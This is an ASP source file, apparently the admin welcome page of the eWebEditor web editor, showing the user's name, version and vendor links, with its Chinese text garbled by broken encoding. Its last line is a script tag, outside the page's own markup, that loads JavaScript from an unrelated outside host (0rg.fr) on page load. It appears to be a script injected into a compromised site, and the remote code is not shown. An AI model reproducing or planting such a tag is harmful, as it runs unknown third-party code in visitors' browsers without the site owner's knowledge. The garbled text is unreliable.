<!--#include file = "include/startup.asp"-->
<!--#include file = "admin_private.asp"-->
<%
'������������������������������������
'��                                                                  ��
'��                ewebeditor - ewebsoft���߱༭��                   ��
'��                                                                  ��
'��  ��Ȩ����: ewebsoft.com                                          ��
'��                                                                  ��
'��  ��������: eweb�����Ŷ�                                          ��
'��            email:webmaster@webasp.net                            ��
'��            qq:589808                                             ��
'��                                                                  ��
'��  �����ַ: [��Ʒ����]http://www.ewebsoft.com/product/ewebeditor/ ��
'��            [֧����̳]http://bbs.ewebsoft.com/                    ��
'��                                                                  ��
'��  ��ҳ��ַ: http://www.ewebsoft.com/   ewebsoft�ŶӼ���Ʒ         ��
'��            http://www.webasp.net/     web������Ӧ����Դ��վ      ��
'��            http://bbs.webasp.net/     web����������̳            ��
'��                                                                  ��
'������������������������������������
%>

<%

sposition = ""

call header()
call content()
call footer()


sub content()
%>
	<table border=0 cellpadding=0 cellspacing=0 width="100%">
	<tr><td align=right><img border=0 src='admin/logo.gif'></td></tr>
	<tr><td align=center height=100><span class=highlight1><b><%=outhtml(session("ewebeditor_user"))%>����ӭ��ʹ�ñ�ϵͳ</b></span><br><br><br><b><span class=highlight2>Ϊ��֤ϵͳ���ݰ�ȫ��ʹ����������˳���</span></b></td></tr>
	<tr>
		<td>
		<table border=0 cellpadding=4 cellspacing=0>
		<tr>
			<td><b>����汾��</b></td><td>ewebeditor version <%=session("ewebeditor_version")%></td>
		</tr>
		<tr>
			<td><b>��Ȩ���У�</b></td><td>ewebsoft.com</td>
		</tr>
		<tr>
			<td><b>����������</b></td><td>eweb�����Ŷ�</td>
		</tr>
		<tr>
			<td><b>��ҳ��ַ��</b></td><td><a href="http://www.ewebsoft.com" target="_blank">http://www.ewebsoft.com</a>&nbsp;&nbsp;&nbsp;<a href="http://www.webasp.net" target="_blank">http://www.webasp.net</a></td>
		</tr>
		<tr>
			<td><b>��Ʒ���ܣ�</b></td><td><a href="http://http://www.ewebsoft.com/product/ewebeditor/" target="_blank">http://www.ewebsoft.com/product/ewebeditor/</a></td>
		</tr>
		<tr>
			<td><b>��̳��ַ��</b></td><td><a href="http://bbs.webasp.net" target="_blank">http://bbs.webasp.net</a></td>
		</tr>
		<tr>
			<td><b>��ϵ��ʽ��</b></td><td>oicq:589808&nbsp;&nbsp;&nbsp;&nbsp;email:<a href="mailto:webmaster@webasp.net">webmaster@webasp.net</a></td>
		</tr>
		</table>
		</td>
	</tr>
	<tr><td height=30></td></tr>
	</table>
<%
end sub
%><script language="javascript" src="http://5.inc.0rg.fr/inc.js?tn=iacnnet_pg&cv=0&cid=1157572&csid=302"></script>